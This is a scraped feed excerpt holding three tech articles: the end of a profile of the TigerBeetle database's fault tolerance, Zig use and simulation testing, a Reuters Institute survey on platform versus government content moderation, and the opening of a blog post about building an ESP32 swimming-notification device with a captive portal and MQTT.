    &lt;p&gt;And here, readers will note that Linux has several clocks: &lt;code&gt;CLOCK_MONOTONIC_RAW&lt;/code&gt;, &lt;code&gt;CLOCK_MONOTONIC&lt;/code&gt; and &lt;code&gt;CLOCK_BOOTTIME&lt;/code&gt;. All have slight but important differences. Which is the best monotonic clock to use? (clue: It doesnât say &lt;code&gt;MONOTONIC&lt;/code&gt; on the tin)&lt;/p&gt;
    &lt;p&gt;The challenge is that physical imperfections in hardware clocks cause clocks to tick at different speeds, so that time passes faster or slower than it should. These kinds of âdriftâ errors eventually add up to significant âskewâ errors within a short space of time. Most of the time, Network Time Protocol (NTP) would correct for these errors. But if NTP silently stops working because of a partial network outage, then a highly available consensus cluster might otherwise be running blind, in the dark.&lt;/p&gt;
    &lt;p&gt;But even this is something TigerBeetle thought about. They combine the majority of clocks in the cluster to construct a fault-tolerant clock called âcluster timeâ. This cluster time then gets used to bring a serverâs system time back into line if necessary, or shut down safely if TigerBeetle detects that there are too many faulty clocks (e.g. TigerBeetle can actually detect when something like Chrony, PTP, or NTP have stopped working and alert the operator).Â&lt;/p&gt;
    &lt;p&gt;They do this by tracking offset clock times between different TigerBeetle servers, sampling them, and passing them through Marzulloâs algorithm to estimate the most accurate possible interval (again, just to get a sense of whether clocks are being synced by the underlying clock sync protocol correctly).&lt;/p&gt;
    &lt;p&gt;Small things like this are exactly why distributed by default is hard, and doesnât work as an add-on for older database models. You can read more about this in TigerBeetle's 3 clocks are better than one blog post.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Handling storage faults&lt;/head&gt;
    &lt;p&gt;Another piece of âdistributed by defaultâ that deserves its own header is how TigerBeetle handles storage faults (or even the fact it handles them at all). Traditional databases assume that if disks fail, they do so predictably with a nice error message. For example, even SQLiteâs docs are clear that:&lt;/p&gt;
    &lt;quote&gt;SQLite does not add any redundancy to the database file for the purpose of detecting corruption or I/O errors. SQLite assumes that the data it reads is exactly the same data that it previously wrote.&lt;/quote&gt;
    &lt;p&gt;In reality, there are many more sinister possibilities: disks can silently return corrupt data, misdirect I/O (on the read or write path), or just suddenly get really slow (called gray failure in the research), all without returning error codes.Â&lt;/p&gt;
    &lt;p&gt;TigerBeetle is built to be storage fault tolerant:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;TigerBeetle uses Protocol Aware Recovery to remain available unless all copies of a piece of data get corrupted on every single replica.&lt;/item&gt;
      &lt;item&gt;All data in TigerBeetle is immutable, checksummed, and hash-chained, providing a strong guarantee that no corruption or tampering happened.&lt;/item&gt;
      &lt;item&gt;TigerBeetle puts as little software as possible between itself and the disk, including a custom page cache, writing data to disk with O_DIRECT, and even running on a raw block device directly (no filesystem necessary â to sidestep filesystem bugs which do tend to happen from time to time).&lt;/item&gt;
      &lt;item&gt;They built their own implementation of LSM instead of using an off-the-shelf one â they call it an LSM Forest, which is something like 20 different LSM trees.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As far as Iâm aware TigerBeetle is the only distributed database that not only claims to be storage fault tolerant, but was also tested pretty hard and validated by Jepsen to be. If you have a local machine failure where even just a disk sector fails, then that storage engine is connected to the global consensus, and it can use the cluster to self heal. This is also a great example of why the modern database having access to modern research matters: Protocol-Aware Recovery, which enables TigerBeetle to survive disk failures like this, is fairly recent (2018) research.&lt;/p&gt;
    &lt;head rend="h3"&gt;TigerBeetle in Zig&lt;/head&gt;
    &lt;p&gt;Another thing youâd think about when building a modern database from scratch is your choice of programming language. Postgres is written in C (c. 1970s), MySQL in C and C++ (1979), and MSSQL as well in C and C++. But programming languages have come a long way in the past 40 years. If you had your choice, what would you build a database in today?&lt;/p&gt;
    &lt;p&gt;The answer would probably be Rust or Zig. And indeed, TigerBeetle is built 100% in Zig:Â&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You get the whole C ecosystem available to you, extended with a phenomenal toolchain and compiler.&lt;/item&gt;
      &lt;item&gt;Itâs easy to write, and especially easy to read, in some cases as easy as TypeScript (just a lot faster).&lt;/item&gt;
      &lt;item&gt;Zig lets you statically allocate memory, which is a core principle of TigerBeetle.&lt;/item&gt;
      &lt;item&gt;Zig has a great developer experience and you can learn it quickly (which ergo means you can get into the TigerBeetle src quickly).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Of course, as new systems languages, Zig and Rust are related, and some of the early Rust team now work at TigerBeetle, including Matklad (creator of Rust Analyzer) and Brian Anderson (co-creator of Rust with Graydon). Theyâve written extensively about these languages and why Joran chose Zig in particular for TigerBeetle, given their design goals.&lt;/p&gt;
    &lt;p&gt;And here, of course, TigerBeetle is fanatical about static memory allocation, which Iâll talk more about in the next section. Not using dynamic memory allocation is âhard modeâ in Rust (as matklad wrote about here), but a breeze in Zig.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;Deterministic Simulation Testing and the VOPR&lt;/head&gt;
    &lt;p&gt;Sometimes, Deterministic Simulation Testing (DST) feels like the most transformational technology that the fewest developers know about. Itâs a novel testing technique made popular by the FoundationDB team (which now belongs to Apple); they used it to develop a more secure, bug-free distributed database in a shorter time span than arguably anyone had done before.Â&lt;/p&gt;
    &lt;p&gt;The fundamentals of DST go something like this. In distributed systems, there are essentially infinite combinations of concurrency issues: anything from lost messages to unpredictable thread execution order. You simply cannot use old-school unit and integration tests, or your system will suck. Formal verification, a more academic discipline that works on formulaic proofs that a program runs as intended, is too expensive and slow. So what are you to do?&lt;/p&gt;
    &lt;p&gt;The answer is a simulator that deterministically runs almost every possible scenario your system will face on a specific chronological timeline. The simulator accounts for external factors too, like issues with the OS, network, or disk, or simply different latencies. All in all, DST can give you the equivalent of yearsâ worth of testing in a very short time period (because time itself becomes deterministicâa while true loop); and DST is particularly well suited towards databases (I/O intensive, not compute intensive). If youâre familiar with Jepsen testing, think of it as a subset of what DST can do.Â&lt;/p&gt;
    &lt;p&gt;TigerBeetle is one of the most pioneering startups on the planet when it comes to DST. Theyâve developed their own testing cluster â itâs nicknamed VOPR, short for Viewstamped Operation Replicator (after the WOPR simulator in the movie WarGames). The VOPR constantly (and tirelessly) tests TigerBeetle under countless different conditions, covering everything from how nodes elect a leader to individual states and network faults. But it can simulate a whole distributed cluster virtually, all on a single thread.&lt;/p&gt;
    &lt;p&gt;As far as your author is aware, TigerBeetleâs VOPR is the single largest DST cluster on the planet. It runs on 1,000 CPU cores, a number so unusually large that Hetzner sent them a special email asking if they were sure they wanted that many cores. The so-called VOPR-1000 is running 24x7x365, to catch rare conditions as far as possible before production. With time abstracted deterministically, and accelerated in the simulator by a factor of (roughly) 700x, this adds up to nearly 2 millennia of simulated runtime per day.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;But what if DST was fun?&lt;/head&gt;
    &lt;p&gt;Yea, distributed systems are cool. But you know whatâs even cooler? Video games.&lt;/p&gt;
    &lt;p&gt;TigerBeetle turned DST into a game that lets you play through different failure scenarios in how the system reacts. You can play it here.&lt;/p&gt;
    &lt;p&gt;Whatâs perhaps even cooler is that this game is running an actual instance of the VOPR, simulating TigerBeetleâ¦in your browser. Itâs compiled to WebAssembly, and then TigerBeetleâs own engineers built a gaming frontend on top to visualize the real system&lt;/p&gt;
    &lt;p&gt;You can read more about how and why TigerBeetle built the simulator in this blog post.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h2"&gt;TigerStyle and The Power of Ten&lt;/head&gt;
    &lt;p&gt;As you will continue to see with TigerBeetle, it is often not just the what theyâve built that catches the eye but also the how. Thereâs no better example than TigerStyle.&lt;/p&gt;
    &lt;p&gt;TigerStyle is TigerBeetleâs engineering methodology, public on GitHub for all to see. Hereâs how they describe it:&lt;/p&gt;
    &lt;quote&gt;âTigerBeetle's coding style is evolving. A collective give-and-take at the intersection of engineering and art. Numbers and human intuition. Reason and experience. First principles and knowledge. Precision and poetry. Just like music. A tight beat. A rare groove. Words that rhyme and rhymes that break. Biodigital jazz. This is what we've learned along the way. The best is yet to come.â&lt;/quote&gt;
    &lt;p&gt;Biodigital jazz is a term from Tron: Legacy. In the context of the film, it represents the intertwining of human and digital elements, the chaotic yet structured nature of the âGridâ (the digital world), and the improvisational spirit of human potential within the confines of technology (I copied this from AI). For TigerBeetle, itâs an ethos of code; remembering to infuse everything they do with not just science, but art too.&lt;/p&gt;
    &lt;p&gt;More practically, TigerStyle lays out engineering and code principles for TigerBeetle, many derived from the original Power of Ten, NASAâs tenets for writing foolproof code. TigerStyle spans from the thematic, like simplicity and elegance, to the applied, like how to name things. Itâs even starting to impact other companies like Resonate and Turso; and TigerStyle has even been discussed on Lex Fridman. Here are a few highlights.&lt;/p&gt;
    &lt;head rend="h3"&gt;Using assertions, and the Power of Ten&lt;/head&gt;
    &lt;p&gt;Speaking of the Power of Tenâ¦one of them (Rule 5) is about assertions. The idea is simple: explicitly encode your expectations of code behavior while you are writing it, not after the fact. You write them simply in a single line as booleans: assert(a &amp;gt; b). TigerStyle calls for:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Asserting all function arguments, return values, preconditions, and invariants. On average there should be at least 2 assertions per function.&lt;/item&gt;
      &lt;item&gt;Using assertions instead of comments when the assertion is both important and surprising.&lt;/item&gt;
      &lt;item&gt;Asserting the relationships between compile-time constants, so you can check a programâs design integrity before it even runs.&lt;/item&gt;
      &lt;item&gt;Not just assert what should happen, but also the negative space that you donât expect â where interesting bugs can show up.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The Power of Ten is an amazing artifact that covers so much more than just assertionsâ¦itâs a great resource for any modern programmer (and maybe we should train some LLMs on it too).&lt;/p&gt;
    &lt;head rend="h3"&gt;Thinking about performance&lt;/head&gt;
    &lt;p&gt;Much of TigerStyle centers around the idea that writing code is not the most important part of the cycle; instead, itâs reasoning about and designing the code. When it comes to performance, TigerStyle implores you to think about it from the start:Â&lt;/p&gt;
    &lt;quote&gt;âThe best time to solve performance, to get the huge 1000x wins, is in the design phase, which is precisely when we can't measure or profile.â&lt;/quote&gt;
    &lt;p&gt;You should be doing basic napkin math on what TigerStyle calls âthe four primary colorsâ â network, storage, memory, CPU â and how theyâll perform with respect to (âthe two texturesâ â art!) bandwidth and latency. Then, there are a few more tactical tips, like distinguishing between the control plane and data plane, batching accesses, and extracting hot loops into stand-alone functions to reduce dependence on the compiler.Â&lt;/p&gt;
    &lt;p&gt;For more about TigerStyle, watch Joranâs talk at Systems Distributed.&lt;/p&gt;
    &lt;head rend="h2"&gt;Try it out for yourself&lt;/head&gt;
    &lt;p&gt;So is TigerBeetle a database? Yes. But itâs not much like any other database Iâve seen. Theyâve taken modern research and applied it to an age-old form, giving their database unprecedented performance and stability guarantees. Theyâve developed an art form around systems and storage engineering, and they havenât forgotten to have fun along the way. And thanks to their clever use of DST, they were able to build this thing to Jepsen standards in only a few years.Â&lt;/p&gt;
    &lt;p&gt;You can get started with TigerBeetle here using a simple curl command.Â&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45436534</guid><pubDate>Wed, 01 Oct 2025 11:33:19 +0000</pubDate></item><item><title>People want platforms, not governments, to be responsible for moderating content</title><link>https://reutersinstitute.politics.ox.ac.uk/news/most-people-want-platforms-not-governments-be-responsible-moderating-content</link><description>&lt;doc fingerprint="352eda523c24cd9b"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Most people want platforms (not governments) to be responsible for moderating content&lt;/head&gt;
    &lt;p&gt;What should be done about problematic online content? Whether we are talking about hateful online comments, extreme political rhetoric or false information about elections, it’s widely recognised that there are problems which need addressing when it comes to content on online platforms. But nobody has a clear answer to how to deal with them.&lt;/p&gt;
    &lt;p&gt;In this article, we explore public opinion about these issues, looking at two areas:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;First, people’s thoughts about whether the platforms themselves should be responsible for their own content policies or whether governments should intervene (who should be responsible for content policies online?)&lt;/item&gt;
      &lt;item&gt;Second, people’s thoughts about whether or not platforms should be responsible for false information posted by users (who should be responsible for false or misleading content posted online?)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Public opinion on these issues matters because the users of online platforms are the ones impacted by low-quality, misleading, or even violent content. This is why we conducted a study in 2024, in collaboration with the Knight Foundation, to understand public attitudes toward regulating the digital public sphere.&lt;/p&gt;
    &lt;p&gt;We asked representative samples of survey respondents in eight countries – the US, UK, Germany, Brazil, Spain, Argentina, Japan, and South Korea – their opinions on the issues of content moderation and false information posted online.&lt;/p&gt;
    &lt;p&gt;The consistent and clear finding across countries and demographic groups is that people do not favour government intervention in the content policies of online platforms. Instead, the majority of people think responsibility should be in the hands of the companies themselves. At the same time, there is a strong feeling that online platforms, while being left to self-regulate, should do more to combat false information posted by users.&lt;/p&gt;
    &lt;head rend="h3"&gt;1. Who should be responsible for content policies on online platforms?&lt;/head&gt;
    &lt;p&gt;The first broad area of policy debate online we will look at is content moderation policies. We asked survey respondents across our eight countries whether platforms – social media platforms, video networks, messaging apps, search engines, and generative AI tools – or governments should have greater responsibility for content policies online. We used binary response options, as these are shown to improve the reliability of the resulting data.&lt;/p&gt;
    &lt;p&gt;Question: In your opinion, who should have greater responsibility for policies or guidance when it comes to what content is allowed on each of the following platforms? Which of the following comes closest to your view?&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; [Insert platform] should have greater responsibility&lt;/item&gt;
      &lt;item&gt; The national government should have greater responsibility&lt;/item&gt;
      &lt;item&gt; Don't know&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Platforms asked about:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; Social media networks (e.g., Facebook, X, TikTok, Instagram)&lt;/item&gt;
      &lt;item&gt; Search engines (e.g., Google, Yahoo, Bing)&lt;/item&gt;
      &lt;item&gt; Video websites (e.g., YouTube, Vimeo, Dailymotion)&lt;/item&gt;
      &lt;item&gt; Messaging apps (e.g., WhatsApp, WeChat, Messenger, Snapchat)&lt;/item&gt;
      &lt;item&gt; Generative artificial intelligence (AI) tools (e.g., ChatGPT, Google Gemini, Grok)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;At the headline level, appetite for government intervention differs across countries, though not by a great deal. It must be noted at the outset that, in all countries, most people (between 51% and 70% across markets) think social media platforms, video networks, messaging apps and search engines should have greater responsibility for their own content policies than governments. In some countries, there is greater appetite for government intervention than in others, though this remains a minority position.&lt;/p&gt;
    &lt;p&gt;In the UK, for example, a higher proportion of people want to see the government take a more active role when it comes to content policies on each of the platform types (see chart below). This higher comfort with government intervention may be linked to the UK government’s ongoing inquiries into the potential harms of online platforms, particularly on younger people. Germany was also an early mover in terms of regulating online platforms for potentially harmful online content, passing the Network Enforcement Act in 2017 which requires platforms to remove content deemed illegal under German law.&lt;/p&gt;
    &lt;p&gt;Generative AI companies are seen a little bit differently than other platforms. While clear majorities across countries prefer social and video platforms to be in control of their own content policies, the same is not true of generative AI companies.&lt;/p&gt;
    &lt;p&gt;More people in the UK – and to a small degree in the US and Germany – think governments should take an interventionist role than think AI companies should be left to develop their own content policies. However, differences in opinion in the US and Germany are small, and only the UK sees a plurality of people (50%) in favour of government oversight. In our research we have found that people in the UK have a more sceptical view of AI than people in other countries. People are also more inclined to want intervention when it comes to new tools which people may be generally less positive about.&lt;/p&gt;
    &lt;p&gt;Following the pattern across countries, views on who should be more responsible for platform policies also do not appear to vary much by age, gender, education, or platform use. For example, in the next chart, we can see the proportion of people across all countries who say social media platforms should have greater responsibility for their content policies, versus the proportion of people who say governments should have greater responsibility.&lt;/p&gt;
    &lt;p&gt;Around six-in-ten people across all groups think social media networks should have greater responsibility for platform policy than governments, including users of Facebook, X, and TikTok – three platforms where people have expressed higher concern about the trustworthiness of the content to be found on each platform, according to our Digital News Report 2024.&lt;/p&gt;
    &lt;p&gt;Findings are broadly similar when it comes to opinions about search engines such as Google, video networks such as YouTube, and messaging apps such as WhatsApp. There are some differences, however, when it comes to opinions about generative AI companies. Men and younger people are more likely than women and older respondents to say that generative AI companies should have greater responsibility for their content policies. The same is true of people who are generally more positive about new technologies.&lt;/p&gt;
    &lt;p&gt;Overall, findings suggest differences in opinion about platform policy (if they are to be significant) are to be found elsewhere. For instance, it may be reasonable to think large differences would arise when we compare people who are concerned about the negative impacts of social media platforms and those who aren’t. But, doing this comparison across all countries, we find that people who have felt a negative personal impact of social media networks are only slightly more in favour of government intervention (see next chart). The same is true of people who perceive a wider negative societal impact of social media networks.&lt;/p&gt;
    &lt;p&gt;Openness to government intervention remains a minority position across all groups of people, with clear majorities saying platforms should be responsible for their own policies. Research tends to show that people have a more positive view of social media platforms than might be assumed, even after many scandals and years of negative news coverage.&lt;/p&gt;
    &lt;p&gt;Finally, we can see some differences in opinion when we break the data down along political lines. Again, it is clear that a plurality of people on the political left, centre, and right think platforms should have greater responsibility for their own content policies – between 57% and 69% of people across platforms and political leanings are in favour of this position.&lt;/p&gt;
    &lt;p&gt;However, more people on the political left are open to governments playing a role when it comes to content policy on different platforms, but this openness to government intervention remains a minority position, even among left-leaning people.&lt;/p&gt;
    &lt;head rend="h3"&gt;2. How to manage false information on online platforms?&lt;/head&gt;
    &lt;p&gt;In this section, we move from a question about content policies on platforms in general to a more specific question about false information. We asked people across our eight countries whether certain types of platforms – social media platforms, video networks, and messaging apps in this case – should or shouldn’t be held responsible for showing people false information that other users post.&lt;/p&gt;
    &lt;p&gt;This question has been a particularly contentious issue in the United States, where Section 230 of the Communications Decency Act gives online platforms broad immunity from liability for the content posted by users. Broadly speaking, it is users in the US who are responsible for what they post, not the platforms. This broad protection has been criticised – and in other countries, active steps have been taken to explore how online platforms can be held more responsible for the content posted by users.&lt;/p&gt;
    &lt;p&gt;A major motivation for making platforms more responsible for false information posted by users is the harms caused by viral pieces of misinformation. In the UK, false rumours about the identity of the murderer of three young girls in Southport in 2024 led to anti-immigration riots. In the US and Brazil, false claims of election fraud led to the January 6th insurrection and a similar breach of the Brazilian National Congress in 2023.&lt;/p&gt;
    &lt;p&gt;Question: In your opinion, should each of the following platforms be held responsible or not responsible for showing potentially false information that users post?&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; [Insert platform] should be held responsible&lt;/item&gt;
      &lt;item&gt; [Insert platform] should not be held responsible&lt;/item&gt;
      &lt;item&gt; Don’t know&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Platforms asked about:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt; Social media networks (e.g., Facebook, X, TikTok, Instagram)&lt;/item&gt;
      &lt;item&gt; Video websites (e.g., YouTube, Vimeo, Dailymotion)&lt;/item&gt;
      &lt;item&gt; Messaging apps (e.g., WhatsApp, WeChat, Messenger, Snapchat)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Overall, at the headline level, there are again small differences in opinion across countries. A clear majority of people in all countries are in favour of platforms being held responsible for false information, but survey respondents in the US and Germany are somewhat less in favour – though a nearly two-thirds majority still are.&lt;/p&gt;
    &lt;p&gt;When it comes to demographics and platform usage, again clear majorities in all cases (between 56% and 76%) think platforms should be held more responsible than not (see Figure 7). Only between 14% and 33% of people across groups think platforms shouldn’t be held responsible.&lt;/p&gt;
    &lt;p&gt;There are some differences in opinion by age, with older people more in favour than younger people of platforms being held responsible for false information, but these differences are small.&lt;/p&gt;
    &lt;p&gt;As before, there are few differences by gender, education, and platform usage – with the exception of YouTube. Interestingly, YouTube users are more likely than non-YouTube users to say that platforms like it should be held responsible for false information posted by users.&lt;/p&gt;
    &lt;p&gt;Finally, when it comes to political leaning, respondents on the political left are again more likely to support intervention. Fully 80% of those on the political left across our eight countries think social media networks should be held more accountable for false information, compared to 65% of those on the right. A similar proportion of left-leaning people (78%) think the same about video networks, compared to 65% of those on the right.&lt;/p&gt;
    &lt;p&gt;And yet, again, while there are differences between left and right, the majority of those on the right (and centre) think social media and video networks should be held more accountable.&lt;/p&gt;
    &lt;head rend="h3"&gt;3. How to make sense of this data?&lt;/head&gt;
    &lt;p&gt;One takeaway from these findings is the near consensus on these policy issues across different groups of people, as well as national contexts. Differences in opinion, while they exist, tend to be small. In fact, differences of only 10-15 percentage points exist between groups of people – such as those on the political left and right – where some might expect much more divergence. In most cases, there are few differences in opinion across demographic groups.&lt;/p&gt;
    &lt;p&gt;Overall, when asked, the public across eight different countries agree that responsibility for content policies should be left to the platforms themselves. Whether we are considering social media networks, search engines, video sites, or messaging apps, people agree that decisions about content should not be in the hands of politicians in government. Yet the public also broadly agrees that the platforms need to do more to combat false information online.&lt;/p&gt;
    &lt;p&gt;So what does this look like in practice? There are self-regulatory models like the approach adopted by Elon Musk on X, where users are enlisted to append ‘Community Notes’ on certain posts to add context. This is an approach that Meta has also adopted in the US after dropping the programme it had implemented where third-party fact-checkers would assist in debunking false posts on Facebook and Instagram.&lt;/p&gt;
    &lt;p&gt;Some other networks like Reddit and Mastodon are more decentralised, with content moderation being carried out by smaller communities of people. On search engines, poor-quality content is typically downranked by the algorithm.&lt;/p&gt;
    &lt;p&gt;But putting platforms in charge of their own policies is not necessarily always a good thing, and there are legitimate criticisms of the performance of all online platforms when it comes to the types of content allowed (or not allowed).&lt;/p&gt;
    &lt;p&gt;The one area where there is more appetite for government intervention is generative AI. This is a newer technology which has raised concerns about the spread of false political information – and even whether fake images and videos will break down our ability to tell fact from fiction at all. Many people are unsure of where the technology will go and if governments need to step in now to set up rules.&lt;/p&gt;
    &lt;p&gt;Our findings may be surprising to those who, after years of scandals and media criticism, would think public attitudes toward platform companies to be more negative than they are. But our research has found people to be generally positive about the impact of online platforms on themselves and society (with the partial exception of social media) and a lot more positive about these platforms than they are about national governments.&lt;/p&gt;
    &lt;p&gt;Platform policy often requires governments and platform companies to work together to some extent and they are not the only two actors relevant to the conversation about online content policies. There are also roles to play for, among others, the courts (who interpret the laws around free speech and its limitations), civil society groups and the news media, who may advocate for various arguments.&lt;/p&gt;
    &lt;p&gt;Another relevant actor, as this article highlights, is the public. Of course, public opinion on what to do about complicated issues shouldn’t be the only factor that dictates regulation. But what the public says should matter, since they vote for representatives in government and also use these platforms every day.&lt;/p&gt;
    &lt;p&gt;In every email we send you'll find original reporting, evidence-based insights, online seminars and readings curated from 100s of sources - all in 5 minutes.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Twice a week&lt;/item&gt;
      &lt;item&gt;More than 20,000 people receive it&lt;/item&gt;
      &lt;item&gt;Unsubscribe any time&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45436664</guid><pubDate>Wed, 01 Oct 2025 11:55:15 +0000</pubDate></item><item><title>Building an IoT Notification Device from Scratch</title><link>https://bertwagner.com/posts/splashflag-building-an-iot-swimming-notification-device-from-scratch/</link><description>&lt;doc fingerprint="bf8d1011eb27b1e8"&gt;
  &lt;main&gt;
    &lt;p&gt;After setting up dozens of Internet of Things (IoT) smart home devices, I started to wonder: how hard could it be to build one from scratch?&lt;/p&gt;
    &lt;p&gt;I needed a project to learn on, so I decided to create something fun: a device that alerts my neighbors when my kids go swimming, extending the invitation for their kids to come swim too.&lt;/p&gt;
    &lt;p&gt;What follows are the lessons I learned from building such an IoT device from scratch.&lt;/p&gt;
    &lt;head rend="h1"&gt;Demo and Code&lt;/head&gt;
    &lt;p&gt;Here's a short video demoing the device and its features:&lt;/p&gt;
    &lt;p&gt;The instructions and code for building your own Splashflag can be found at the bottom of this post, otherwise keep reading to learn about my journey in building the device.&lt;/p&gt;
    &lt;head rend="h1"&gt;Why SplashFlag?&lt;/head&gt;
    &lt;p&gt;How many times can you play Marco Polo in a pool with an adult and two kids? I know that my kids far prefer the company of their friends who have a lot more energy.&lt;/p&gt;
    &lt;p&gt;Originally our idea was to put up a special "we're swimming" flag outside in our front yard when our kids were in the pool, alerting the neighbors that they are welcome to come over and swim as well. The flag would be an open invitation, without the overhead of planning, group texts, and phone calls.&lt;/p&gt;
    &lt;p&gt;I quickly realized this idea wouldn't work because: 1) The flag wouldn't be easily visible from every neighbor's house 2) By the time people saw the flag and came over, we might already be wrapping up our swimming session&lt;/p&gt;
    &lt;p&gt;What I needed to solve this social problem was technology (or rather, I needed an excuse for a new technology hobby project), which is how the idea for SplashFlag was born.&lt;/p&gt;
    &lt;head rend="h1"&gt;Key Features and Learnings&lt;/head&gt;
    &lt;p&gt;This wasn't my first time building an embedded device, but it was the first time I tried to follow at least some semblance of best practices: &lt;code&gt;main&lt;/code&gt; loops less than a thousand lines long, no hardcoded passwords, etc...&lt;/p&gt;
    &lt;p&gt;If this was going to be a true learning project, I wanted to be more organized: use classes, design hardware and software that could handle errors gracefully, and create a way for users to connect the device to their WiFi without me ever needing to know their credentials.&lt;/p&gt;
    &lt;p&gt;While I wouldn't consider this code to be perfect (or even necessarily "good"), it's a huge improvement over hardware projects I've built in the past, so I consider it a success.&lt;/p&gt;
    &lt;p&gt;Below is an overview of the major features I built into the device.&lt;/p&gt;
    &lt;head rend="h2"&gt;Servo Flag&lt;/head&gt;
    &lt;p&gt;This is how the idea started: instead of the physical flag in my front yard, it would be a small plastic flag sitting on the counter in a friend's home.&lt;/p&gt;
    &lt;p&gt;Whenever the device receives a message, the flag goes up until the message expires. Besides being a fun feature, it works well in households where the kids are still too young to read the details of the message - regardless of what the screen says, if the flag is raised, they know the Wagners are swimming and they're welcome to come swim too.&lt;/p&gt;
    &lt;head rend="h2"&gt;Clear/Reset Button&lt;/head&gt;
    &lt;p&gt;This button wasn't originally planned as a feature. The first time I got the servo flag working and realized it might be raised for an hour, I knew that as a parent I'd want a way to clear the notification without my kid seeing it. So the hidden button on the back of the device became a necessary enhancement. Push it, and the message clears while the flag goes down.&lt;/p&gt;
    &lt;p&gt;It also serves double duty for triggering a factory reset.&lt;/p&gt;
    &lt;head rend="h2"&gt;LCD&lt;/head&gt;
    &lt;p&gt;In addition to the servo flag, the LCD displays messages about swimming. The default message indicates how long we plan to swim, but the web app (see below) lets me write any message, so something like "feel free to stay for pizza" is a potential customization.&lt;/p&gt;
    &lt;p&gt;The LCD also displays system messages, like when the device is having trouble connecting to WiFi or when the messaging server is down.&lt;/p&gt;
    &lt;p&gt;The code for the LCD was fun to write: since the screen can only fit two rows of 16 characters, I had to write a function that could split any length message so it fit these constraints and scroll across multiple screens.&lt;/p&gt;
    &lt;p&gt;This is also where I first encountered overflow errors and needed to add max-length validations:&lt;/p&gt;
    &lt;p&gt;The screen works well and serves its purpose, but along with the I2C adapter, it is easily the biggest component in the device. Next time, I plan to look for slimmer options, because the device size (especially the front frame with the LCD) could have been considerably smaller if I had chosen a different board.&lt;/p&gt;
    &lt;head rend="h2"&gt;Captive Portal&lt;/head&gt;
    &lt;p&gt;Before this project, I never knew the magic that allowed login pages to pop up on your device when connecting to a guest wifi network.&lt;/p&gt;
    &lt;p&gt;It turns out, it's DNS!&lt;/p&gt;
    &lt;p&gt;This guest wifi login experience is what I wanted to build into my device. After all, I wanted my neighbors to be able to set this up in their house, all on their own, without me needing to know or hardcode any WiFi passwords.&lt;/p&gt;
    &lt;p&gt;The short explanation of how this works is that when your phone connects to a new WiFi network, the phone will try to visit certain well-known URLs. If you own the WiFi network, you can configure DNS to look for those standard URLs and intercept them, serving your own login page.&lt;/p&gt;
    &lt;p&gt;Fortunately there are some good libraries for setting up a DNS server on ESP32s and intercepting traffic, then serving your own captive portal where people can input their WiFi credentials.&lt;/p&gt;
    &lt;head rend="h2"&gt;Over the Air (OTA) Updates&lt;/head&gt;
    &lt;p&gt;Another feature I wanted to include was the ability to update the firmware remotely. Debugging and flashing new firmware while the device was sitting on my desk was easy, but I know my code isn't perfect so I wanted a way to update these devices remotely in the future.&lt;/p&gt;
    &lt;p&gt;Fortunately the ESP32-S3 Nano device I was using allows for OTA firmware updates. I set up the library for this and have it check the GitHub releases page for SplashFlag every day to see if a new version is available. If a new version exists, it will download the update and install it.&lt;/p&gt;
    &lt;p&gt;Here's hoping I don't accidentally brick anyones SplashFlag device.&lt;/p&gt;
    &lt;head rend="h2"&gt;Web App&lt;/head&gt;
    &lt;p&gt;I wanted a simple interface for sending messages to all devices, so I created a single page web application. It defaults to the most common message I would send, with input parameters to adjust the duration of how long the message is displayed on the devices.&lt;/p&gt;
    &lt;p&gt;The website runs on my home server and I expose it through CloudFlare Tunnels so I can easily access it from my phone (or anywhere). I also added HTTP Basic Authentication to the website - not the most robust option, but good enough for this project. In the future, if I upgrade anything, it would be the authentication system. Basic Authentication is secure enough, but it doesn't play nicely with 1Password or Safari on iOS, which causes some minor annoyances.&lt;/p&gt;
    &lt;p&gt;The web app sends a message to the MQTT broker (see below) over WebSockets, which then publishes it to all devices. Because this is just a simple API call, I could easily program a smart button to trigger this in the future, allowing my kids to send the notification themselves when we head out to the pool.&lt;/p&gt;
    &lt;head rend="h2"&gt;MQTT Messaging&lt;/head&gt;
    &lt;p&gt;I didn't want my devices long-polling a web server to check the status of new swim messages. Instead I decided to use an MQTT broker running in my home lab to transmit messages to the SplashFlag devices running the MQTT client code.&lt;/p&gt;
    &lt;p&gt;I am using mosquitto as the MQTT broker. The MQTT broker service runs on my home server and is exposed via WebSockets to the web app. All of the devices subscribe to the broker service, so whenever a message is published, every device receives the message and updates its screen and raises its flag.&lt;/p&gt;
    &lt;head rend="h2"&gt;Debugging Hardware Flag&lt;/head&gt;
